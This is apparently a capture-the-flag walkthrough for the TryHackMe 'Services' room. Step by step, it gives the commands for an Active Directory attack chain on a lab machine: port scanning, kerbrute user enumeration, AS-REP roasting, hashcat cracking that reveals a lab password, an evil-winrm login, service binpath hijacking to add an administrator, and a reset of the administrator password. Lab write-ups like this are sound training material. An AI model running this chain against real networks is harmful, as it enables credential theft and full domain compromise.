
![Screenshot from 2023-07-24 12-07-44](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/60b869f4-3ea0-4594-98c5-06636e1e0b8d)

# Services-THM-Walkthrough

This is the writeup for the Services CTF challenge on TryHackMe!
https://tryhackme.com/room/services

tags: enumerate, hash cracking, exploit, brute-force, kerbrute

Highlight: Enumerating active directory users using kerbrute, capturing a password hash using AS-REP-ROASTING.


## **ENUMERATION**

First let's kick things off with some classic nmap scans to get a lay of the land.
Initial Setup

export IP=10.10.117.221
export myIP=10.13.24.71
 
sudo nmap -v --min-rate 10000 <Target's IP address> -p- | grep open

We can use standard expressionw to efficiently sort nmap results and grab all of the open ports for a script scan.

`cat tmp | sed 's/\// /g' | awk '{print $1}' | tr "\n" ","`
![Screenshot from 2023-07-24 11-49-23](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/6ad9c92d-8bd2-44a0-9e5a-fc7beea1f90b)

We'll follow up now with a full scan:
`sudo nmap -v -sVC -oN nmap.txt <Target's IP address> -p <ports>`

roasting:
smbclient -L //$IP/
smbmap -u 'anonymous' -H $IP

ENUMERATION:
walk the port 80 website. We quickly identify some employee names from the employees listed on the site.

![Screenshot from 2023-07-24 12-03-22](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/6d7f921d-534f-4d0a-a579-cb570525e633)

And here is a naming convention, revealed by the contact email:
![Screenshot from 2023-07-24 12-05-09](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/994b794b-6a50-47e1-b3bf-d04ac846b860)

Using the naming convention from the contact email, we can compile a shortlist now of possible usernames.
![Screenshot from 2023-07-24 12-12-54](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/d6fd88fd-be54-4efa-b96a-006dc9a1f653)

Next, we'll move on to active directory username enumeration.
## **KERBRUTE**

`kerbrute userenum --dc $IP -d services.local users.txt`

We found some valid users!
![Screenshot from 2023-07-24 12-20-23](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/8b76634d-69bc-4aba-a1e9-8ac9310376e6)

AS-REP ROASTING WITH GetNPUsers.py:
`GetNPUsers.py -dc-ip $IP -request 'services.local/' -usersfile users.txt -format hashcat`

![Screenshot from 2023-07-24 12-22-08](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/7632cdf0-fc94-4e3c-a083-f3a2d592afde)
Boom Shack-a-lacka! j.rock hash is revealed!

## **CRACKING THE HASH WITH HASHCAT**
Use hashcat to crack the hash:
`hashcat -m 18200 hash.txt rockyou.txt'

Bingo! We are in business. Let's log in next with evil-winrm with our newly-found creds.
j.rock:Serviceworks1

## **EVIL-WINRM**
`evil-winrm -i $IP -u j.rock -p Serviceworks1`

## **LOCAL ENUMERATION**
`whoami /all`

We see that j.rock is in the 

Next, let's check services:

`services`
![Screenshot from 2023-07-24 12-26-09](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/7f82a997-9476-47a3-af3a-910d4bf1479d)


Our privesc path forward will be binpath hijacking with the ADWS service. 

build a revshell exe binary with this github:
https://github.com/dev-frog/C-Reverse-Shell

## **BINPATH HIJACKING**
`sc.exe config ADWS binpath="net localgroup administrators j.rock /add"`
start and stop the service
log out/in

CHANGE THE ADMIN PASSWORD
net user administrator hellothisisatest123!

log out and back in with admin 
![Screenshot from 2023-07-24 12-41-24](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/52b256ff-1582-4ca6-bb24-61959a69ebc9)

grab the root flag!
![Screenshot from 2023-07-24 12-42-11](https://github.com/CTF-Walkthroughs/Services-THM-Walkthrough/assets/97861439/8577bce9-6fcf-4975-83b8-dce228acc582)


